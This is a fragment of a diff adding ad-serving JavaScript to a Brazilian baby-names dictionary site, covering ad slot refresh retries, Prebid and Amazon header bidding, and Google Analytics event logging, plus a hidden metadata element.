+                debugScript(sgIntervalRefreshAds.debug,`intervalRefreshAd slotRenderEnded slot: isEmpty: ${event.isEmpty} | ${slot.getAdUnitPath()}`, slot);
+                if(event.isEmpty && !slot.sgIntervalRefreshIsEmpty) {
+                    if (!slot.sgIntervalRefreshIsEmpty) {
+                        slot.sgIntervalRefreshIsEmpty = true;
+                        slot.sgIntervalRefreshIsEmptyCount = 0; 
+                        slot.sgIntervalRefreshIsEmptyTimer = setInterval(function() {
+                            slot.sgIntervalRefreshIsEmptyCount++;
+                            debugScript(sgIntervalRefreshAds.debug,`intervalRefreshAd retry ${slot.getAdUnitPath()} | attempt: ${slot.sgIntervalRefreshIsEmptyCount}`, slot);
+                            
+                            if (slot.sgIntervalRefreshIsEmptyCount >= slot.sgRefreshRetryMaxAttempts) {
+                                clearInterval(slot.sgIntervalRefreshIsEmptyTimer);
+                                slot.sgIntervalRefreshIsEmpty = false;
+                                slot.sgIntervalRefreshIsEmptyTimer = null;
+                                debugScript(sgIntervalRefreshAds.debug,`intervalRefreshAd retry max attempts stop ${slot.getAdUnitPath()}`, slot);
+                                return;
+                            }
+                            
+                            
+                (function() {
+                    slot.sgRequestManager = { 
+                        adserverRequestSent: false,
+                        aps: false,
+                        prebid: false
+                    };
+
+                    function biddersBack() {
+                        if (slot.sgRequestManager.aps && slot.sgRequestManager.prebid) {
+                            sendAdserverRequest();
+                        } 
+                        return;
+                    }
+
+                    function sendAdserverRequest() {
+                        if (slot.sgRequestManager.adserverRequestSent === true) {
+                            return;
+                        }
+                        slot.sgRequestManager.adserverRequestSent = true;
+                        googletag.cmd.push(function() {
+                            googletag.pubads().refresh([slot]);
+                        });
+                    }
+
+                    const apsRefreshSlot = {
+                        slotID: slot.getSlotElementId(),
+                        sizes: slot.getSizes().map(size => [size.getWidth(), size.getHeight()])
+                    };
+
+                    apstag.fetchBids({slots: [apsRefreshSlot], timeout: 2000},
+                        function(bids) {
+                            googletag.cmd.push(function(){
+                                apstag.setDisplayBids();
+                                slot.sgRequestManager.aps = true;
+                                biddersBack();
+                            });
+                    });
+
+                    pbjs.que.push(function() {
+                        pbjs.requestBids({
+                            timeout: 2000,
+                            adUnitCodes: [slot.getSlotElementId()],
+                            bidsBackHandler: function() {
+                                pbjs.setTargetingForGPTAsync([slot.getSlotElementId()]);
+                                slot.sgRequestManager.prebid = true;
+                                biddersBack(); 
+                            }
+                        });
+                    });
+
+                    window.setTimeout(function() {
+                        sendAdserverRequest();
+                    }, 2500); 
+                })();
+                
+                        }, slot.sgRefreshRetryTime * 1000);
+                    }
+                } else if (!event.isEmpty) {
+                    if (slot.sgIntervalRefreshIsEmptyTimer) {
+                        clearInterval(slot.sgIntervalRefreshIsEmptyTimer);
+                        debugScript(sgIntervalRefreshAds.debug,`intervalRefreshAd retry stop on success: isEmpty: ${event.isEmpty} | ${slot.getAdUnitPath()}`, slot);
+                        slot.sgIntervalRefreshIsEmptyTimer = null;
+                    }
+                    slot.sgIntervalRefreshIsEmpty = false;
+                    slot.sgIntervalRefreshIsEmptyCount = 0;
+                }
+            });
+             var gae=function(e,s){if(!window.localStorage || window.localStorage.getItem("sg_gpt_event")!=="1")return;if(typeof gtag!=="undefined"){gtag("event",e,{event_category:"Sg_GPT",event_label:s.getAdUnitPath(),non_interaction:true})}else if(typeof ga!=="undefined")ga("send","event","Sg_GPT",e,s.getAdUnitPath(),0,{nonInteraction:true})};googletag.pubads().addEventListener("impressionViewable",function(e){gae("ImpressionViewable",e.slot)});googletag.pubads().addEventListener("slotRenderEnded",function(e){gae("SlotRenderEnded",e.slot)});window.Sg_GPT_get_slots=function(){return slots};
+                function executeParallelAuctionAlongsidePrebid(){var t={adserverRequestSent:!1,aps:!1,prebid:!1};function s(){t.aps&&t.prebid&&e()}function e(){!0!==t.adserverRequestSent&&(t.adserverRequestSent=!0,googletag.cmd.push(function(){googletag.pubads().refresh()}))}apstag.fetchBids({slots:[s0,s1,s2]},function(e){googletag.cmd.push(function(){apstag.setDisplayBids(),t.aps=!0,s()})}),pbjs.que.push(function(){pbjs.addAdUnits([{"code":"div-gpt-sg-ee5ecc5de0c6d686a3d0b8914b62da9c","mediaTypes":{"banner":{"sizeConfig":[{"minViewPort":[0,0],"sizes":[]},{"minViewPort":[300,0],"sizes":[[300,250],[250,250]]},{"minViewPort":[336,0],"sizes":[[336,280],[300,250],[250,250]]},{"minViewPort":[768,0],"sizes":[[468,60],[320,50],[300,50],[234,60]]},{"minViewPort":[1280,0],"sizes":[[728,90],[468,60]]}]}},"bids":[{"bidder":"yandex","params":{"placementId":"R-A-6880209-5"}},{"bidder":"richaudience","params":{"pid":"aXqovU977c","supplyType":"site"}},{"bidder":"smartadserver","params":{"siteId":"656269","pageId":"1976938","formatId":"130607"}}]},{"code":"div-gpt-sg-d635bb963154acc213946d180f366c18","mediaTypes":{"banner":{"sizeConfig":[{"minViewPort":[0,0],"sizes":[]},{"minViewPort":[300,0],"sizes":[[300,250],[250,250]]},{"minViewPort":[336,0],"sizes":[[336,280],[300,250],[250,250]]},{"minViewPort":[768,0],"sizes":[[468,60],[320,50],[300,50],[234,60]]},{"minViewPort":[1280,0],"sizes":[[728,90],[468,60]]}]}},"bids":[{"bidder":"yandex","params":{"placementId":"R-A-6880209-6"}},{"bidder":"richaudience","params":{"pid":"4H0oxusxGs","supplyType":"site"}},{"bidder":"smartadserver","params":{"siteId":"656269","pageId":"1976938","formatId":"130608"}}]},{"code":"div-gpt-sg-4935e8baebbb53475070b004917bcab1","mediaTypes":{"banner":{"sizeConfig":[{"minViewPort":[0,0],"sizes":[]},{"minViewPort":[300,0],"sizes":[[300,250],[250,250]]},{"minViewPort":[336,0],"sizes":[[336,280],[300,250],[250,250]]},{"minViewPort":[768,0],"sizes":[[728,90],[468,60]]},{"minViewPort":[990,0],"sizes":[[970,90],[728,90],[970,66],[468,60]]}]}},"bids":[{"bidder":"yandex","params":{"placementId":"R-A-6880209-15"}},{"bidder":"richaudience","params":{"pid":"wKdq2PmRPH","supplyType":"site"}},{"bidder":"smartadserver","params":{"siteId":"656269","pageId":"1976938","formatId":"130617"}}]}]),pbjs.requestBids({timeout:2e3,bidsBackHandler:function(){googletag.cmd.push(function(){pbjs.setTargetingForGPTAsync(),t.prebid=!0,s()})}})}),window.setTimeout(function(){e()},3e3)}executeParallelAuctionAlongsidePrebid();
+            });})()</script>
+    <sg-bhof projecturl="https://www.dicionariodenomesproprios.com.br" contenturl="/nomes-femininos/" backofficeurl="https://www.dicionariodenomesproprios.com.br/backoffice/" projectid="13" contentid="0" contenttype="" contenttypefeedback="" contentdata="{
+            " datepublished":"",="" "dateupdated":""="" }"="" style="display:none" mode="production" newarch=""></sg-bhof>
+
+
+</body></html>
